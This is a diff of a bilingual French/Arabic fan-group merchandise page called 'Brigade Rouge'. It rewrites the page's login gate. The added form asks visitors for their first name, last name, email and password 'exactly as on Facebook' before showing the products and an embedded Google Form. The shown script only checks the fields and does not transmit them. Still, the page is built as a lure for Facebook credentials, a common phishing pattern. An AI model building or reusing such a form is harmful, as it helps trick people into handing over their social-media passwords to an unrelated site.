@@ -14,58 +14,48 @@
     overflow: hidden;
   }
 
-  /* فيديو الخلفية */
-  #background-video {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    z-index: 0;
-    filter: brightness(0.6);
-  }
-
-  /* طبقة الضباب */
-  #blur-overlay {
+  /* الفيديو الخلفي */
+  #video-background {
     position: fixed;
     top: 0; left: 0;
     width: 100%; height: 100%;
-    backdrop-filter: blur(10px);
-    z-index: 1;
+    object-fit: cover;
+    z-index: 0;
+    filter: blur(10px);
+    opacity: 0.6;
   }
 
-  /* نافذة تسجيل الدخول شفافة جزئياً مع ضباب داخلي */
+  /* نافذة تسجيل الدخول */
   #login-box {
     position: fixed;
     top: 50%; left: 50%;
     transform: translate(-50%, -50%);
-    background: rgba(28, 28, 28, 0.5);
+    background: rgba(28,28,28,0.9);
     color: #fff;
     padding: 30px;
     border-radius: 15px;
-    box-shadow: 0 0 30px rgba(0,0,0,0.7);
-    backdrop-filter: blur(10px);
+    box-shadow: 0 0 20px rgba(0,0,0,0.5);
     z-index: 2;
-    width: 300px;
+    width: 350px;
     text-align: center;
-    border: 1px solid rgba(255,255,255,0.2);
   }
 
   #login-box h2 {
-    margin-bottom: 20px;
+    margin-bottom: 15px;
     color: #ff0000;
   }
 
   #login-box p {
-    margin-bottom: 20px;
-    color: #fff;
     font-size: 14px;
+    margin-bottom: 10px;
   }
 
-  #login-box input {
+  #login-box input[type="text"],
+  #login-box input[type="email"],
+  #login-box input[type="password"] {
     width: 90%;
     padding: 10px;
-    margin: 10px 0;
+    margin: 8px 0;
     border: none;
     border-radius: 8px;
   }
@@ -74,10 +64,25 @@
     padding: 10px 20px;
     border: none;
     border-radius: 8px;
-    background: #4267B2; /* لون فيسبوك */
+    background: #ff0000;
     color: #fff;
     font-weight: bold;
     cursor: pointer;
+    margin-top: 10px;
+  }
+
+  #login-box label {
+    display: block;
+    margin: 10px 0;
+    font-size: 14px;
+    cursor: pointer;
+  }
+
+  #error-message {
+    color: red;
+    font-weight: bold;
+    margin-top: 10px;
+    display: none;
   }
 
   /* المحتوى الرئيسي */
@@ -85,9 +90,15 @@
     display: none;
     padding: 50px;
     text-align: center;
-    color: #fff;
-    z-index: 2;
+    z-index: 1;
     position: relative;
+  }
+
+  #group-image img {
+    width: 300px;
+    border-radius: 15px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    margin: 20px 0;
   }
 
   #products {
@@ -98,7 +109,7 @@
   }
 
   .product {
-    background: rgba(255, 255, 255, 0.9);
+    background: #fff;
     border-radius: 15px;
     padding: 20px;
     width: 220px;
@@ -132,26 +143,39 @@
 </head>
 <body>
 
-<!-- فيديو الخلفية -->
-<video autoplay muted loop id="background-video">
-  <source src="https://www.w3schools.com/howto/rain.mp4" type="video/mp4">
-  متصفحك لا يدعم الفيديو.
+<video autoplay muted loop id="video-background">
+  <source src="videoplayback (1).mp4" type="video/mp4">
+  Votre navigateur ne supporte pas la vidéo.
 </video>
 
-<!-- طبقة الضباب -->
-<div id="blur-overlay"></div>
-
-<!-- نافذة تسجيل الدخول -->
 <div id="login-box">
   <h2>Connexion</h2>
-  <p>Ajoutez votre compte Facebook pour assurer votre propriété</p>
-  <input type="text" id="facebook" placeholder="Lien ou nom de votre compte Facebook">
-  <button onclick="login()">Se Connecter avec Facebook</button>
+  <p>Veuillez entrer vos informations EXACTES comme sur Facebook</p>
+  <p>الرجاء إدخال معلوماتك بالضبط كما على فيسبوك</p>
+
+  <input type="text" id="prenom" placeholder="Prénom / الاسم">
+  <input type="text" id="nom" placeholder="Nom / اللقب">
+  <input type="email" id="email" placeholder="Email / البريد الإلكتروني">
+  <input type="password" id="password" placeholder="Mot de passe / كلمة المرور">
+
+  <label>
+    <input type="checkbox" id="facebook-consent">
+    J'accepte de fournir mes informations Facebook / أوافق على تقديم معلوماتي من فيسبوك
+  </label>
+
+  <button onclick="login()">M'ACCEPTER / أوافق</button>
+
+  <div id="error-message">Erreur / خطأ</div>
 </div>
 
-<!-- المحتوى الرئيسي -->
 <div id="main-content">
   <h1>Bienvenue à Brigade Rouge</h1>
+
+  <!-- صورة مجموعة Al Brigade Rouge ESS -->
+  <div id="group-image">
+    <img src="https://i.postimg.cc/XYZ1234/al-brigade-rouge-ess.jpg" alt="Al Brigade Rouge ESS">
+  </div>
+
   <div id="products">
     <div class="product">
       <img src="https://i.postimg.cc/5tq8pj3P/Screenshot-2025-08-18-06-33-16-83.jpg" alt="Produit 1">
@@ -171,20 +195,39 @@
     </div>
   </div>
 
-  <!-- Google Form -->
   <iframe src="https://docs.google.com/forms/d/e/1FAIpQLScdmDLZ9413J4vXO94dCu6AIwU-D9CKJIf-Rlu68JdiWy1lfA/viewform?embedded=true"></iframe>
 </div>
 
 <script>
   function login() {
-    const facebook = document.getElementById('facebook').value;
+    const prenom = document.getElementById('prenom').value.trim();
+    const nom = document.getElementById('nom').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const consent = document.getElementById('facebook-consent').checked;
+    const errorMessage = document.getElementById('error-message');
 
-    if(facebook) {
-      document.getElementById('login-box').style.display = 'none';
-      document.getElementById('main-content').style.display = 'block';
-    } else {
-      alert('Veuillez entrer votre compte Facebook pour continuer');
+    errorMessage.style.display = 'none';
+
+    if (!prenom || !nom || !email || !password) {
+      errorMessage.style.display = 'block';
+      return;
     }
+
+    if (!consent) {
+      errorMessage.style.display = 'block';
+      return;
+    }
+
+    // تحقق بسيط من البريد الإلكتروني
+    if(email.indexOf('@') === -1) {
+      errorMessage.style.display = 'block';
+      return;
+    }
+
+    // إذا كل شيء صحيح، نعرض المحتوى الرئيسي
+    document.getElementById('login-box').style.display = 'none';
+    document.getElementById('main-content').style.display = 'block';
   }
 </script>
 
